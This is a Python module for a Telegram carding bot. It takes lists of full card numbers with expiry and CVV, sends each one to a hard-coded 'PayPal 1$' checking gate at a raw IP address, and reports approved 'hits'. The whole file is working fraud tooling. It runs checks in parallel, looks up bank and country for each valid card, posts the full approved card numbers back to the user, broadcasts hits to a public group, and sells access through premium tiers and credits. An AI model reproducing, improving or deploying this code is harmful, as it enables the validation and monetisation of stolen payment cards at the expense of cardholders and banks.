# gates/masspp.py
import asyncio
import aiohttp
import json
import re
import time
import io
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.constants import ParseMode
from telegram.ext import ContextTypes, CallbackQueryHandler, CommandHandler, Application
import logging

from config import (
    OWNER_ID,
    ADMIN_IDS,
    DEVELOPER_LINK,
    DEVELOPER_NAME,
    BULLET_GROUP_LINK,
    AUTHORIZATION_CONTACT,
    PUBLIC_GROUP_ID,
)
from utils.mass_progress import render_mass_progress, stop_keyboard

try:
    from utils.credits import is_unlimited as _is_unlimited
except Exception:
    def _is_unlimited(uid: int) -> bool:
        return uid == OWNER_ID or uid in ADMIN_IDS

logger = logging.getLogger(__name__)

# --- CONFIGURATION ---
PP_API_URL = "http://65.109.212.144:8080/check?cc="
PP_CARD_REGEX = re.compile(r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b")

# Active checks tracker
active_mass_checks = {}

# Global application reference
bot_application = None


def set_application(application):
    """Store the application reference for later use."""
    global bot_application
    bot_application = application


# Import database functions
try:
    from db import get_user, update_user
    logger.info("✅ Imported db functions")
except ImportError:
    try:
        from main import get_user, update_user
        logger.info("✅ Imported main functions")
    except ImportError:
        async def get_user(user_id: int):
            return None
        async def update_user(user_id: int, **kwargs):
            return False

# --- PREMIUM USER CHECK ---
async def is_premium_user(user_id: int) -> bool:
    if user_id == OWNER_ID:
        return True
    if user_id in ADMIN_IDS:
        return True
    
    try:
        user_data = await get_user(user_id)
        if not user_data:
            return False
        
        plan = str(user_data.get('plan', '')).strip()
        if "Silver" in plan or "Gold" in plan or "Platinum" in plan or "Diamond" in plan:
            return True
        return False
    except Exception:
        return False

async def get_user_role(user_id: int) -> tuple:
    if user_id == OWNER_ID:
        return "𝙊𝙒𝙉𝙀𝙍 🦂", "🦂"
    if user_id in ADMIN_IDS:
        return "𝘼𝘿𝙈𝙄𝙉 🔥", "🔥"
    
    try:
        user_data = await get_user(user_id)
        if user_data:
            plan = str(user_data.get('plan', '')).strip()
            if "Sliver" in plan:
                return "𝘚𝘪𝘭𝘷𝘦𝘳", "🧪"
            elif "Platinum" in plan:
                return "𝘗𝘭𝘢𝘵𝘪𝘯𝘶𝘮", "💎"
            elif "Gold" in plan:
                return "𝘎𝘰𝘭𝘥", "🌤️"
            elif "Diamond" in plan:
                return "𝘋𝘪𝘢𝘮𝘰𝘯𝘥", "🏆"
    except Exception:
        pass
    
    return "𝙁𝙍𝙀𝙀", "⏳"

async def consume_credit(user_id: int) -> bool:
    try:
        user_data = await get_user(user_id)
        if user_data and user_data.get("credits", 0) > 0:
            new_credits = user_data["credits"] - 1
            await update_user(user_id, credits=new_credits)
            logger.info(f"Consumed 1 credit from user {user_id}")
            return True
        return False
    except Exception:
        return False

# --- HELPER FUNCTIONS ---
def extract_cards_from_text(text: str) -> list:
    cards = []
    for line in text.split('\n'):
        line = line.strip()
        if not line:
            continue
        match = PP_CARD_REGEX.search(line)
        if match:
            card, mm, yy, cvv = match.groups()
            mm = mm.zfill(2)
            yy = yy[-2:] if len(yy) == 4 else yy
            cards.append(f"{card}|{mm}|{yy}|{cvv}")
    return cards

async def get_bin_info(bin_number: str) -> dict:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://lookup.binlist.net/{bin_number}", timeout=5) as response:
                if response.status == 200:
                    data = await response.json()
                    return {
                        "scheme": data.get("scheme", "𝙐𝙣𝙠𝙣𝙤𝙬𝙣"),
                        "bank": data.get("bank", {}).get("name", "𝙐𝙣𝙠𝙣𝙤𝙬𝙣"),
                        "country": data.get("country", {}).get("name", "𝙐𝙣𝙠𝙣𝙤𝙬𝙣"),
                        "emoji": data.get("country", {}).get("emoji", "")
                    }
    except Exception:
        pass
    return {"scheme": "𝙐𝙣𝙠𝙣𝙤𝙬𝙣", "bank": "𝙐𝙣𝙠𝙣𝙤𝙬𝙣", "country": "𝙐𝙣𝙠𝙣𝙤𝙬𝙣", "emoji": ""}

async def check_pp_card(session: aiohttp.ClientSession, card: str) -> dict:
    try:
        url = PP_API_URL + card
        async with session.get(url, timeout=30) as response:
            if response.status != 200:
                return {"status": "error", "message": f"𝙃𝙏𝙏𝙋 {response.status}"}
            text = await response.text()
            try:
                data = json.loads(text)
                status = data.get("status", "").upper()
                response_msg = data.get("response", "𝙉𝙤 𝙧𝙚𝙨𝙥𝙤𝙣𝙨𝙚")
                
                # 👇 DECLINED CONDITIONS (ORDER_NOT_APPROVED included)
                declined_keywords = [
                    "ORDER_NOT_APPROVED",
                    "Payer Cannot Pay",
                    "PAYER_CANNOT_PAY",
                    "Order Not Approved",
                    "Cannot",
                    "Not", 
                    "DECLINED",
                    "DO_NOT_HONOR",
                    "INSUFFICIENT_FUNDS",
                    "STOLEN_CARD",
                    "PICKUP_CARD",
                    "RESTRICTED_CARD",
                    "GENERIC_DECLINE"
                ]
                
                # Check if response contains any declined keyword
                response_upper = response_msg.upper()
                is_declined = any(keyword in response_upper for keyword in declined_keywords)
                
                # Check if approved
                is_approved = (
                    status == "APPROVED" or 
                    "approved" in response_msg.lower() or 
                    "success" in response_msg.lower() or
                    "charged" in response_msg.lower()
                ) and not is_declined  # 👈 declined हो तो approve मत करो
                
                return {
                    "status": "approved" if is_approved else "declined",
                    "message": response_msg,
                    "api_status": status
                }
            except json.JSONDecodeError:
                text_upper = text.upper()
                # 👇 अगर JSON नहीं है तो भी ORDER_NOT_APPROVED चेक करो
                if "ORDER_NOT_APPROVED" in text_upper:
                    return {"status": "declined", "message": "ORDER_NOT_APPROVED", "api_status": "DECLINED"}
                elif "approved" in text.lower() or "success" in text.lower():
                    return {"status": "approved", "message": "𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡", "api_status": "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"}
                return {"status": "error", "message": "𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝘼𝙋𝙄 𝙧𝙚𝙨𝙥𝙤𝙣𝙨𝙚"}
    except asyncio.TimeoutError:
        return {"status": "error", "message": "𝘛𝘪𝘮𝘦𝘰𝘶𝘵 (30𝘴)"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

      
def create_status_keyboard(user_id: int, approved: int = 0, declined: int = 0, total: int = 0) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"🔥 𝘾𝙃𝘼𝙍𝙂𝙀 : {approved}", callback_data="noop"),
            InlineKeyboardButton(f"❌ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 : {declined}", callback_data="noop")
        ],
        [InlineKeyboardButton(f"📊 𝙏𝙤𝙩𝙖𝙡 : {total}", callback_data="noop")],
        [InlineKeyboardButton("🦂 𝙎𝙏𝙊𝙋", callback_data=f"stop_masspp:{user_id}")]
    ])

def create_complete_keyboard(approved: int, declined: int, total: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"🔥 𝘾𝙃𝘼𝙍𝙂𝙀  : {approved}", callback_data="noop"),
            InlineKeyboardButton(f"❌ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 : {declined}", callback_data="noop")
        ],
        [InlineKeyboardButton(f"📊 𝙏𝙤𝙩𝙖𝙡 : {total}", callback_data="noop")]
    ])

def create_stopped_keyboard(approved: int, declined: int, processed: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"💎 𝘾𝙃𝘼𝙍𝙂𝙀 : {approved}", callback_data="noop"),
            InlineKeyboardButton(f"❌ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 : {declined}", callback_data="noop")
        ],
        [InlineKeyboardButton(f"🔄 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 : {processed}", callback_data="noop")]
    ])

# --- MASS PROCESSING FUNCTION ---
# --- Concurrency tuning (parallel like /mrz) ---
MASSPP_CONCURRENCY = 10

# --- MASS PROCESSING FUNCTION ---
async def process_masspp(user_id: int, cards: list, message_obj, update: Update):
    total_cards = len(cards)

    # Pre-charge credits for ALL cards up-front (like /mrz / /msh do)
    unlimited = _is_unlimited(user_id)
    if unlimited:
        cards_to_check = list(cards)
    else:
        user_data = await get_user(user_id)
        available_credits = int((user_data or {}).get("credits", 0) or 0)
        if available_credits <= 0:
            await update.message.reply_text(
                "❌ <b><i>𝙄𝙣𝙨𝙪𝙛𝙛𝙞𝙘𝙞𝙚𝙣𝙩 𝙘𝙧𝙚𝙙𝙞𝙩𝙨!</i></b>",
                parse_mode=ParseMode.HTML
            )
            return
        cards_to_check = cards[:available_credits] if available_credits < total_cards else list(cards)
        if not cards_to_check:
            await update.message.reply_text(
                "❌ <b><i>𝙄𝙣𝙨𝙪𝙛𝙛𝙞𝙘𝙞𝙚𝙣𝙩 𝙘𝙧𝙚𝙙𝙞𝙩𝙨!</i></b>",
                parse_mode=ParseMode.HTML
            )
            return
        try:
            await update_user(user_id, credits=available_credits - len(cards_to_check))
        except Exception:
            pass

    total_cards = len(cards_to_check)
    start_time = time.time()

    try:
        status_msg = await message_obj.reply_text(
            render_mass_progress(
                gate_name="PayPal 1$",
                total=total_cards,
                checked=0,
                card="-",
                response="-",
                start_time=start_time,
            ),
            reply_markup=stop_keyboard(callback_data=f"stop_masspp:{user_id}"),
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        logger.error(f"Failed to send status message: {e}")
        return

    active_mass_checks[user_id] = {
        "stop": False,
        "message_id": status_msg.message_id,
        "chat_id": status_msg.chat_id,
        "status_msg": status_msg
    }

    stats = {"approved": 0, "declined": 0, "errors": 0, "checked": 0}
    progress = {"card": "-", "response": "-"}
    progress_lock = asyncio.Lock()
    semaphore = asyncio.Semaphore(MASSPP_CONCURRENCY)

    connector = aiohttp.TCPConnector(limit=MASSPP_CONCURRENCY, limit_per_host=MASSPP_CONCURRENCY)
    timeout_obj = aiohttp.ClientTimeout(total=60)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout_obj) as session:
        async def worker(card: str):
            if active_mass_checks.get(user_id, {}).get("stop", False):
                return
            async with semaphore:
                if active_mass_checks.get(user_id, {}).get("stop", False):
                    return
                card_start = time.time()
                result = await check_pp_card(session, card)
                elapsed_card = time.time() - card_start

            async with progress_lock:
                stats["checked"] += 1
                if result["status"] == "approved":
                    stats["approved"] += 1
                elif result["status"] == "declined":
                    stats["declined"] += 1
                else:
                    stats["errors"] += 1
                progress["card"] = card
                progress["response"] = result.get("message") or "-"

            if result["status"] == "approved":
                bin_number = card.split("|")[0][:6]
                bin_info = await get_bin_info(bin_number)

                user_role, role_emoji = await get_user_role(user_id)
                user_full_name = update.effective_user.first_name or "𝙐𝙨𝙚𝙧"
                if update.effective_user.last_name:
                    user_full_name += f" {update.effective_user.last_name}"

                user_clickable = f'<a href="tg://user?id={user_id}">{user_full_name}</a> [{user_role} {role_emoji}]'

                BULLET_SYMBOL_1 = "⊀"
                BULLET_SYMBOL_2 = "⌬"
                bullet_link_1 = f'<a href="{BULLET_GROUP_LINK}">{BULLET_SYMBOL_1}</a>'
                bullet_link_2 = f'<a href="{BULLET_GROUP_LINK}">{BULLET_SYMBOL_2}</a>'
                developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

                response_msg = result.get("message", "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙")
                if len(response_msg) > 60:
                    response_msg = response_msg[:60] + "..."

                approved_msg = (
                    f"✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿\n\n"
                    f"{bullet_link_1} 𝘾𝙖𝙧𝙙\n"
                    f"⤷ <code>{escape(card)}</code>\n\n"
                    f"{bullet_link_1} 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↣ 𝙋𝙖𝙮𝙋𝙖𝙡 1$\n"
                    f"{bullet_link_1} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ↣ <code>{escape(response_msg)}</code>\n\n"
                    f"<pre>"
                    f"𝑩𝒓𝒂𝒏𝒅 ↬ {escape(bin_info['scheme'])}\n"
                    f"𝑩𝒂𝒏𝒄 ↬ {escape(bin_info['bank'])}\n"
                    f"𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ↬ {escape(bin_info['country'])} {bin_info['emoji']}"
                    f"</pre>\n\n"
                    f"{bullet_link_2} 𝘿𝙀𝙑 ↣ {developer_clickable}\n"
                    f"{bullet_link_2} 𝘾𝙝𝙚𝙘𝙠 𝘽𝙮 ↣ {user_clickable}\n\n"
                    f"𝙏𝙞𝙢𝙚 ↣ {elapsed_card:.1f}𝙨"
                )
                try:
                    await update.effective_message.reply_text(
                        approved_msg,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True
                    )
                except Exception as e:
                    logger.error(f"Failed to send approved card: {e}")

                # ✅ Broadcast Hit to public group
                try:
                    user_full_name_safe = escape(user_full_name)
                    user_mention_pub = f'<a href="tg://user?id={user_id}">{user_full_name_safe}</a>'
                    bot_link_pub = '<a href="https://t.me/DarkCxC_Bot">𝘚𝘱𝘢𝘤𝘦 𝘊𝘩𝘬</a>'
                    hit_message = (
                        '<tg-emoji emoji-id="5219804923130038865">💎</tg-emoji> '
                        '<b>𝑯𝑰𝑻 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅</b> '
                        '<tg-emoji emoji-id="4916036072560919511">💎</tg-emoji>\n'
                        '━━━━━━━━\n'
                        f'𝘜𝘴𝘦𝘳 ➞ {user_mention_pub}\n'
                        f'𝘚𝘵𝘢𝘵𝘶𝘴 ➞ Approved <tg-emoji emoji-id="5125343104638912114">✅</tg-emoji>\n'
                        f'𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 ➞ <code>{escape(response_msg)}</code>\n'
                        f'𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ➞ PayPal 1$ (Mass)\n'
                        '━━━━━━━━\n'
                        f'𝑯𝑰𝑻 𝑭𝒓𝒐𝒎 ➞ {bot_link_pub}'
                    )
                    await update.get_bot().send_message(
                        chat_id=PUBLIC_GROUP_ID,
                        text=hit_message,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=False,
                    )
                except Exception as e:
                    logger.error(f"Failed to broadcast hit: {e}")

        async def progress_updater():
            last = -1
            while stats["checked"] < total_cards and not active_mass_checks.get(user_id, {}).get("stop", False):
                await asyncio.sleep(2)
                if stats["checked"] == last:
                    continue
                last = stats["checked"]
                try:
                    await status_msg.edit_text(
                        render_mass_progress(
                            gate_name="PayPal 1$",
                            total=total_cards,
                            checked=stats["checked"],
                            charged=stats["approved"],
                            approved=0,
                            declined=stats["declined"],
                            card=progress["card"],
                            response=progress["response"],
                            start_time=start_time,
                        ),
                        reply_markup=stop_keyboard(callback_data=f"stop_masspp:{user_id}"),
                        parse_mode=ParseMode.HTML
                    )
                except Exception:
                    pass

        tasks = [asyncio.create_task(worker(c)) for c in cards_to_check]
        updater_task = asyncio.create_task(progress_updater())
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            updater_task.cancel()

    was_stopped = active_mass_checks.get(user_id, {}).get("stop", False)
    elapsed_total = time.time() - start_time

    try:
        await status_msg.edit_text(
            render_mass_progress(
                gate_name="PayPal 1$",
                total=total_cards,
                checked=stats["checked"],
                charged=stats["approved"],
                approved=0,
                declined=stats["declined"],
                card="-",
                response="Stopped by user" if was_stopped else "Complete",
                elapsed=elapsed_total,
                in_progress=False,
            ),
            parse_mode=ParseMode.HTML
        )
    except Exception:
        pass

    if user_id in active_mass_checks:
        del active_mass_checks[user_id]

# --- MAIN COMMAND HANDLER ---
async def masspp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    logger.info(f"/masspp command from user {user_id}")
    
    is_premium = await is_premium_user(user_id)
    
    if not is_premium:
        await update.message.reply_text(
            "🔒 <b><i>𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙁𝙀𝘼𝙏𝙐𝙍𝙀</i></b>\n\n"
            "❌ <b>𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙞𝙨 𝙤𝙣𝙡𝙮 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝙛𝙤𝙧 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙪𝙨𝙚𝙧𝙨!</b>\n\n"
            f"👑 <b>𝘾𝙤𝙣𝙩𝙖𝙘𝙩:</b> <a href=\"{DEVELOPER_LINK}\">{AUTHORIZATION_CONTACT}</a>",
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )
        return
    
    if user_id in active_mass_checks:
        await update.message.reply_text(
            "⏳ <b><i>𝙔𝙤𝙪 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙝𝙖𝙫𝙚 𝙖𝙣 𝙖𝙘𝙩𝙞𝙫𝙚 𝙢𝙖𝙨𝙨 𝙘𝙝𝙚𝙘𝙠!</i></b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    cards = []
    
    if update.message.document:
        doc = update.message.document
        if doc.mime_type == 'text/plain' or (doc.file_name and doc.file_name.endswith('.txt')):
            try:
                file = await doc.get_file()
                file_bytes = await file.download_as_bytearray()
                file_text = file_bytes.decode('utf-8')
                cards = extract_cards_from_text(file_text)
            except Exception:
                pass
    
    elif update.message.reply_to_message:
        replied_msg = update.message.reply_to_message
        if replied_msg.document:
            doc = replied_msg.document
            if doc.mime_type == 'text/plain' or (doc.file_name and doc.file_name.endswith('.txt')):
                try:
                    file = await doc.get_file()
                    file_bytes = await file.download_as_bytearray()
                    file_text = file_bytes.decode('utf-8')
                    cards = extract_cards_from_text(file_text)
                except Exception:
                    pass
        elif replied_msg.text:
            cards = extract_cards_from_text(replied_msg.text)
    
    elif context.args:
        text = " ".join(context.args)
        cards = extract_cards_from_text(text)
    
    if not cards:
        await update.message.reply_text(
            "🧠 <b><i>𝙍𝙚𝙥𝙡𝙮 𝙒𝙞𝙩𝙝 𝘾𝙘𝙨 𝘼𝙣𝙙 .𝙩𝙭𝙩 𝙁𝙞𝙡𝙡</i></b>\n\n"
            "💎 <b>𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙁𝙚𝙖𝙩𝙪𝙧𝙚</b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    logger.info(f"Starting mass check for user {user_id} with {len(cards)} cards")
    asyncio.create_task(process_masspp(user_id, cards, update.message, update))

# --- STOP HANDLER ---
async def stop_masspp_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if not query.data.startswith("stop_masspp:"):
        return
    
    user_id = int(query.data.split(":")[1])
    
    if query.from_user.id != user_id:
        await query.answer("❌ 𝙔𝙤𝙪 𝙘𝙖𝙣'𝙩 𝙨𝙩𝙤𝙥 𝙤𝙩𝙝𝙚𝙧𝙨' 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙨!", show_alert=True)
        return
    
    if user_id in active_mass_checks:
        active_mass_checks[user_id]["stop"] = True
        await query.answer("🛑 𝙎𝙩𝙤𝙥𝙥𝙞𝙣𝙜 𝙥𝙧𝙤𝙘𝙚𝙨𝙨...", show_alert=False)

# --- NOOP HANDLER ---
async def noop_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return
    
    try:
        await query.answer()
    except:
        pass

# --- REGISTER FUNCTION ---
def register_masspp_handlers(application):
    logger.info("📝 Registering masspp handlers...")
    set_application(application)
    logger.info("✅ Masspp handlers registered")
    
    application.add_handler(CommandHandler("masspp", masspp_command))
    application.add_handler(CallbackQueryHandler(
        stop_masspp_handler, 
        pattern=r"^stop_masspp:"
    ))
    application.add_handler(CallbackQueryHandler(
        noop_handler, 
        pattern=r"^noop"
    ))
